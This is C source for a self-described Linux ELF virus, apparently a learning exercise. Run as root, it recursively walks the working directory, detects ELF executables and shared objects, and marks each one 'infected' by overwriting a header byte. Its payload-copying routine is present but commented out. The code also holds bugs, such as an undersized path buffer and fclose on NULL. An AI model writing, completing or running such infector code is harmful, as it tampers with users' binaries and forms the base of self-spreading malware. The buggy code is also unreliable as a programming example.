#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <elf.h>
#include <sys/stat.h>

int edit_magic(char* file_name)
{
    FILE* f = fopen(file_name, "rb+");
    if (f == NULL)
    {
        fclose(f);
        return 0;
    }

    // Read the header of the file
    Elf64_Ehdr header;
    if (fread(&header, sizeof(Elf64_Ehdr), 1, f) != 1) {
        fclose(f);
        return 0;
    }

    // Seek back to the start of the file
    if (fseek(f, 0, SEEK_SET) != 0) {
        return 0;
    }

    // Edit the header of the file
    header.e_ident[15] = 01;
    if (fwrite(&header, 1, sizeof(header), f) != sizeof(header)) {
        fclose(f);
        return 0;
    }
    fclose(f);
    return 1;
}

int is_infected(char* file_name)
{
    FILE* f = fopen(file_name, "rb");
    if (f == NULL)
    {
        fclose(f);
        return 0;
    }

    // Read the header of the file
    Elf64_Ehdr header;
    if (fread(&header, sizeof(Elf64_Ehdr), 1, f) != 1) {
        fclose(f);
        return 0;
    }
    fclose(f);

    // Check if 
    char path[4096];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
    if (len != -1) {
        path[len] = '\0';  // Null-terminate the string
    } else {
        exit(EXIT_FAILURE);
    }

    // Check if the elf magic has been modified or not
    return header.e_ident[15] == 01 || strcmp(file_name, path) == 0;
}

int is_executable(char* file_name)
{
    // Open the file
    FILE *f = fopen(file_name, "rb");
    if (f == NULL)
    {
        fclose(f);
        return 0;
    }

    // Read the header of the file
    Elf64_Ehdr header;
    if (fread(&header, sizeof(Elf64_Ehdr), 1, f) != 1) {
        fclose(f);
        return 0;
    }
    fclose(f);

    // Check if the file is an ELF file
    return header.e_ident[0] == ELFMAG0 && header.e_ident[1] == ELFMAG1 && header.e_ident[2] == ELFMAG2 && header.e_ident[3] == ELFMAG3 && (header.e_type == 2 || header.e_type == 3);
}

int infect_ELF(char* file_name)
{
    // // Open the file
    // FILE *f = fopen(file_name, "rb+");
    // if (f == NULL)
    // {
    //     fclose(f);
    //     return 0;
    // }
    
    // // Read the header of the file
    // Elf64_Ehdr header;
    // if (fread(&header, sizeof(Elf64_Ehdr), 1, f) != 1) {
    //     fclose(f);
    //     return 0;
    // }
    // fclose(f);

    // // Open the executed file
    // FILE* executed_file = fopen("/proc/self/exe", "rb");
    // if (executed_file == NULL) {
    //     fclose(executed_file);
    //     return 0;
    // }

    // // Read the header of the executed file
    // Elf64_Ehdr executed_header;
    // if (fread(&executed_header, sizeof(Elf32_Ehdr), 1, executed_file) != 1) {
    //     fclose(executed_file);
    //     return 0;
    // }

    // // Calculate the executable code offset
    // int executable_offset = executed_header.e_phoff + (executed_header.e_phentsize * executed_header.e_phnum);

    // if (fseek(executed_file, executable_offset, SEEK_SET) != 0) {
    //     return 0;
    // }

    // // Determine the size of the payload to copy
    // fseek(executed_file, 0, SEEK_END);
    // long file_size = ftell(executed_file);
    // long payload_size = file_size - executable_offset;

    // // Allocate payload and seek back to the start of executable content
    // char *payload = malloc(payload_size);
    // if (payload == NULL) {
    //     fclose(executed_file);
    //     return 0;
    // }
    // if (fseek(executed_file, executable_offset, SEEK_SET) != 0)
    // {
    //     fclose(executed_file);
    //     return 0;
    // }

    // // Read content into payload
    // if (fread(payload, 1, payload_size, executed_file) != payload_size) {
    //     fclose(executed_file);
    //     free(payload);
    //     return 0;
    // }

    // fclose(executed_file);

    // f = fopen(file_name, "wb");
    // if (f == NULL)
    // {
    //     fclose(f);
    //     return 0;
    // }

    // if (fseek(f, 0, SEEK_END) != 0)
    // {
    //     fclose(f);
    //     return 0;
    // }

    // if (fwrite(&payload, 1, sizeof(payload), f) != sizeof(payload)) {
    //     fclose(f);
    //     return 0;
    // }

    // fclose(f);

    edit_magic(file_name);
    return 1;
}

int prepare_infect_ELF(char* file_name)
{
    if(is_executable(file_name))
    {
        printf("Executable! ");
        if(!is_infected(file_name))
        {
            printf("Start infecting! ");
            infect_ELF(file_name) ? printf("Infect successfully!\n") : printf("Infect failed!\n");
        }
        else
        {
            printf("Already infected!\n");
            return 0;
        }
    }
    else
    {
        printf("Not executable!\n");
        return 0;
    }
    return 1;
}

void dir_traversal(char* dir_path)
{
    DIR *dir;
    struct dirent *ent;
    dir = opendir(dir_path); // open current directory
    if (dir) 
    {
        while ((ent = readdir(dir)) != NULL) 
        {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) {
                continue;
            }
            
            if (ent->d_type == DT_DIR)
            {
                char* new_dir_path = malloc(strlen(dir_path) + strlen(ent->d_name) + 2 * sizeof(char));
                new_dir_path = strcpy(new_dir_path, dir_path);
                strcat(new_dir_path, "/");
                strcat(new_dir_path, ent->d_name);
                printf("%s/\n", ent->d_name);
                // printf("%s\n", new_dir_path);
                dir_traversal(new_dir_path);
                free(new_dir_path);
            }
            else if (ent->d_type == DT_REG)
            {
                char* file_path = malloc(strlen(dir_path) + strlen(ent->d_name) + 1 * sizeof(char));
                file_path = strcpy(file_path, dir_path);
                strcat(file_path, "/");
                strcat(file_path, ent->d_name);
                printf("%s ", ent->d_name);
                // printf("%s ", file_path);
                prepare_infect_ELF(file_path);
                free(file_path);
            }
        }
        closedir(dir);
    }
}

int main(int argc, char** argv)
{
    if (geteuid() == 0)
    {
        printf("Hello, I am a virus!\n");
        char* dir_path;
        size_t size;

        // Get the size for the dir_path by using NULL
        size = pathconf(".", _PC_PATH_MAX);
        if ((dir_path = (char *)malloc((size_t)size)) != NULL) {
            if (getcwd(dir_path, size) != NULL) {
                dir_traversal(dir_path);
            }
        }
        free(dir_path);
    }
    return 0;
}